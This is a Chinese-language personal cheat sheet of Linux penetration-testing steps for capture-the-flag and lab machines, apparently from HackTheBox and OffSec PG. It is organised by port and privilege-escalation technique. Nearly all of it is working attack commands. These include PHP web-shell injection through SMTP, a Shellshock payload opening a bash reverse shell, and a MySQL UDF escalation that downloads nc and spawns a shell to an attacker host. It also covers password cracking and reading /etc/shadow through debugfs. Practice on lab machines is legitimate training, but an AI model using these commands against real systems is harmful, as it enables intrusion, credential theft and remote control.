---
title: "linux笔记"
excerpt: "Linux渗透测试"
collection: portfolio
---
xi渗透测试一般流程（linux独立机）
注意网页端源码
1.	主机发现
2.	
使用arp-scan -l或nftdiscover -r发现ip

3.	端口扫描
4.	
Nmap -p- -sS -A --min-rate 1000 ip

nmap -sU -top-ports=20 10.129.138.95

5.	端口利用

zip -r -o info.php.zip info.php（压缩为压缩包

21:ftp登陆，主要弱口令有FTP，ftp，anonymous，Anonymous以及靶机名字等。

/usr/share/wordlists/legion/ftp-betterdefaultpasslist.txt，ftp爆破密码字典
如果发现无法显示，输入passive
22：ssh登陆，可能会直接有信息。
-o HostkeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa，登陆

25：smtp查看
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.222.147

25端口可能会有邮件，去/var/mail查看
Telnet ip 25
MAIL FROM: icepeak
RCPT TO: helios
data
<?php system($_GET['cmd']); ?>
.
QUIT

53：dns攻击端口
可能会有反向ip
nslookup -ty=ptr 10.129.227.211 10.129.227.211
同时在/etc/hosts写入

80：网页端，用浏览器查看，同时
1.	Dirsearch -u ip或dirb -u http://IP -X .txt .html .js查看是否有文件包含等漏洞。

2.curl -v -X OPTIONS http://192.168.20.151/test
查看是否有文件可以上传

3.curl -v -T shell.php -H 'Expect:' http://192.168.66.130/test/
以put的方式上传shell.php

4.Shell反弹，详见oscp

5. '  || 'a' like 'a sql注入

6. wpscan --url http://192.168.55.147 -U Elliot -P fsocity.dic -t 50 wpscan爆破

7.whatweb -v ip

8. curl http://192.168.222.152/image.php?secrettier360=/etc/passwd|jq(在kali查看网页端内容)

9. wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://192.168.222.152/index.php?FUZZ
Fuzz爆破模糊测试
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt --hw 0  --hc 404 http://192.168.2.133/index.php?page=FUZZ

10.wpscan –url http:// -e u（扫描用户）/ wpscan -url http：// （扫描插件）这里需要域名而非ip地址

11. nikto -h 192.168.0.106:666（nikto测试漏洞）

12.burp抓包可能有信息

13. gobuster dir -u http://192.168.106.140 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x sh 目录爆破
或者directory-list-lowercase-2.3-medium.txt

14.wireshark筛选
http.request.method=="POST"，可能包含登陆信息

15.发现cgi-bin目录可以进行扫描cgi-bin目录

16.shellshock攻击nmap -p80 -sV --script http-shellshock --script-args "uri=/cgi-bin/user.sh,cmd=/bin/bash -i >& /dev/tcp/10.10.16.13/1234 0>&1" 10.129.24.75
要找到可以攻击的地方

17. dnsenum --dnsserver 10.10.10.13 cronos.htb或者gobuster vhost -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50 -u siteisup.htb>2.txt
枚举域名

110（solidstate）：telnet ip 110（邮件登陆）
User admin
Pass admin（账号密码登陆）
List（查看所有邮件）
Retr 1（查看第一封邮件）

161：1.snmpwalk -v 2c -c public 10.10.11.136
–v：指定snmp的版本, 1或者2c或者3
–c：指定连接设备SNMP密码
2.	snmp-check ip -p 161
扫描snmp进程信息

443：nmap -sV -T4扫描出现ssl/http考虑心脏出血漏洞

666（temple of doom）：burp抓包查看

873:rsync端口
1.rsync -av rsync://192.168.147.126/查看文件

2.rsync -av rsync://192.168.233.126/fox ./fox
下载文件

3128：ssh端口
vim /etc/proxychains4.conf编辑proxy文件
http 192.168.142.145 3128写入
proxychains ssh john@192.168.142.145 -t "/bin/sh"可以执行ssh

3306：mysql端口：
Mysql配置错误攻击
show variables like 'plugin_dir';

SHOW VARIABLES LIKE "secure_file_priv";
查看信息
create table foo(line blob);

insert into foo values(load_file('/var/www/raptor_udf2.so'));

select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';

create function do_system returns integer soname 'raptor_udf2.so';

select * from mysql.func;

select do_system('id > /var/www/out; chown www-data.www-data /var/www/out');

\! sh
此时我们是root权限，接下来上传nc

select do_system('wget http://192.168.49.246:8295/nc -O /var/www/nc');

select do_system('chmod 777 /var/www/nc');

select do_system('/var/www/nc 192.168.49.246 8295 -e /bin/bash');


4555（solidstate）：nc 192.168.0.0 4555
Root/root（默认账号密码）
Listusers（列出所有账号名）
Setpassword user 123456（将user的密码改为123456）

4655：ssh端口，使用时使用-p 4655参数

6379：redis端口，查看redis是否可以使用，查看历史漏洞redis-cli -h 192.168.192.69，输入info查看信息

7744：ssh端口，使用时使用-p 7744参数

31337：nc ip 31337登陆

65534：ftp登陆端口，使用时使用-p 65534参数

3（）.工具利用
	1.Weevely工具：
weevely generate <password>  <path>/xx.php
weevely  <url>  <password>（上面是生成，下面是在网页中使用）

3.	网络设置/etc/init.d/networking restart

4.	exiftool工具，用于读取、写入和编辑图像、音频和视频文件中的元数据）exiftool shell.Jpg或者steghide extract -sf trytofind.jpg，输入密码查看

  4. crunch工具
crunch 13 13 -t 'bev,%%@@^1995'>pass.txt
13 13输入最长和最短密码长度
-t 'bev,%%@@^1995'
定义密码的模板模式：
•	bev,：固定字符，直接出现在密码开头。
•	%%：占位符，表示2位数字（% 默认代表数字 0-9）。
•	@@：占位符，表示2位小写字母（@ 默认代表小写字母 a-z）。
•	^：占位符，表示1位大写字母（^ 默认代表大写字母 A-Z）。
•	1995：固定字符，直接出现在密码末尾。

  5.john爆破使用—wordlist=pass使用pass爆破
密码

  6.作用同上 
fcrackzip -v -D -p passwd.txt -u t0msp4ssw0rdz.zip

  7.带盐值的MD5解密使用密文$盐值形式
  john -form=dynamic_6 pass.txt解密

  8. gobuster dir -u http://192.168.4.144:8008/NickIzL33t/ -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/537.36" -w /root/wordlist/rockyou.txt -x html

  9.发现users.db文件，可以使用nc -nvlp 6666 > users.db和nc 10.10.11.16 6666 < /aa/ad/users.db进行传送,使用sqlite3 users.db进行查看。

  10. socat TCP-LISTEN:8081，resueaddr,fork TCP:127.0.0.1:8080端口转发，即访问8081就是访问8080

  11.命令劫持，如下步骤
  https://www.cnblogs.com/siqi/p/3604354.html
  Echo $PATH
Echo “/bin/bash”>/tmp/ls
Export Path=/tmp:$PATH
Echo $PATH
Chmod 777 /tmp/ls
查看地址
https://www.freebuf.com/articles/system/173903.html

 12.php伪协议
php://filter/read=convert.base64-encode/resource=config
php://filter/read=convert.base64-encode/resource=upload
php://filter/read=convert.base64-encode/resource=login
php://filter/read=convert.base64-encode/resource=index

 13.mysql登陆
 mysql --ssl=0 -h 192.168.106.144  -uroot -pH4u%QJ_H99

 14.mysql更改密码
 Update drupaldb.users set pass=“” where name=“”；

 15.enum4linux -a -o ip枚举

 16. smbclient //ip/或smbclient -L ip连接   
 或使用smbclient //ip/ --user user名连接   

 17.hashcat 1.txt /usr/share/wordlists/rockyou.txt密码寻找   

 18.john shadow_file --format=crypt主要的破解大方法     

 19.sslscan扫描   

 20. fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt ab.zip   
    
 21. ffuf -u 'http://linkvortex.htb' -H 'host:FUZZ.linkvortex.htb' -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -fs 230 -t 100
使用fuff爆破域名

 22.如果有.git目录，使用git-dumper http://dev.linkvortex.htb/.git website/下载  
 
 23. echo -n a235561351813137123456 | md5sum 
生成盐值为 a235561351813137的123456的密文md5    

 24. redis-cli -h 192.168.156.69查看redis的信息
输入info查看信息    

 25.sqlmap使用--os-shell参数实现内部shell
                            
26.401嗅探，即弹出输入账号密码
Admin/admin
Admin/123456
Admin/password
Admin/secret
6.	内网收集
1.	Find / -perm -4000 -type f 2>/dev/null，收集suid文件

2.	Find / -perm -777 -type f 2>/dev/null，收集可执行文件

3.	Uname -a 和 lsb_release -a内核信息,内核提权

4.	Cat /etc/crontab和cat /etc/cron*和ps aux查

5.	看定时任务

6.	Find / -writable 2>/dev/null查找可以写入的文件

7.	Sudo -l

8.	Cd /home

9.	如果可以cat /home/*/.bash_history

10.	敏感文件login.php和wp-login.php
在/var/www或/var/www/html之下

10. 多用户管理面板，并且有任意代码执行漏洞
即SHADOWSOCKS-LIBEV 命令执行漏洞
https://nosec.org/home/detail/1589.html
（temple of doom）

11.	敏感目录/usr/local/bin

11.敏感文件backup.Sh和backups.sh
（pinky-palace-2）

12.	newgrp更改组

13. find / -writable ! -path '/run/*' ! -path '/lib/*' ! -path '/sys/*' ! -path '/proc/*' ! -path '/dev/*' 2>/dev/null
命令解释：
分别用于排除 /run、/lib、/sys、/proc 和 /dev 目录及其子目录下的文件和目录。

14.如果无法使用wget下载文件，使用nc下载
靶机：nc ip port < exp
Kali：nc -nvlp port > exp

15.find / -user admin 2>/dev/null查看当前用户可以使用的文件

 16.nc连接时如果没有反应可以尝试busybox nc

 17.nc也无法下载，使用base64，
 靶机：Base64 agent
 Kali：cat 1.txt|base64 -d > agent

7.	权限提升
1.	sudo -l查看是否可以提权

2.	searchsploit提权

3.	查看敏感文件提权
Find / -perm -4000 -type f 2>/dev/null
寻找suid文件
Find / -perm -777 -type f 2>/dev/null
寻找可读可写可执行文件
getcap -r / 2>/dev/null
寻找Capabilities文件，即索具有特殊权限（capabilities）的文件
Newgrp换组
4.	ssh -L 9898:localhost:9898 gael@10.10.11.74 -fN ssh本地端口转发。（artifical）

5.	ltrace ./agent也是缓冲区溢出的一种方法
  /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
生成200个字符
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 41366641
查看偏移量

7.进行横向移动时，用户名可能就是密码，同时wordpress的wp-config也可能是密码。



hackthebox用http-proxy
pg用socks-proxy
ifconfig tun0 mtu 1000

重启网络方法
以管理员身份运行命令提示符：
cmd
# 停止 VMware 服务
net stop "VMware NAT Service"
net stop "VMware DHCP Service"
# 启动 VMware 服务  
net start "VMware DHCP Service"
net start "VMware NAT Service"
3. 在虚拟机内重置网络
bash
# 完全清理网络配置
sudo systemctl stop NetworkManager
sudo pkill dhclient
sudo ip addr flush dev eth0
sudo ip link set eth0 down
sudo ip link set eth0 up

# 重启 NetworkManager
sudo systemctl start NetworkManager
sleep 3

# 现在尝试获取 IP
sudo dhclient -v eth0

磁盘组提权方法
id
uid=1000(dora) gid=1000(dora)groups=1000(dora),6(disk)
有6可以看到属于磁盘组
df -h
df -h
Filesystem                         Size  Used Avail Use% Mounted on
/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.2G  55% /
udev                               947M     0  947M   0% /dev
tmpfs                              992M     0  992M   0% /dev/shm
tmpfs                              199M  1.2M  198M   1% /run
tmpfs                              5.0M     0  5.0M   0% /run/lock
tmpfs                              992M     0  992M   0% /sys/fs/cgroup
/dev/loop0                          62M   62M     0 100% /snap/core20/1611
/dev/loop4                          68M   68M     0 100% /snap/lxd/22753
/dev/loop2                          50M   50M     0 100% /snap/snapd/18596
/dev/loop3                          92M   92M     0 100% /snap/lxd/24061
/dev/loop1                          64M   64M     0 100% /snap/core20/1852
/dev/sda2                          1.7G  209M  1.4G  13% /boot
tmpfs                              199M     0  199M   0% /run/user/1000
debugfs /dev/mapper/ubuntu--vg-ubuntu--lv
cat /etc/shadow



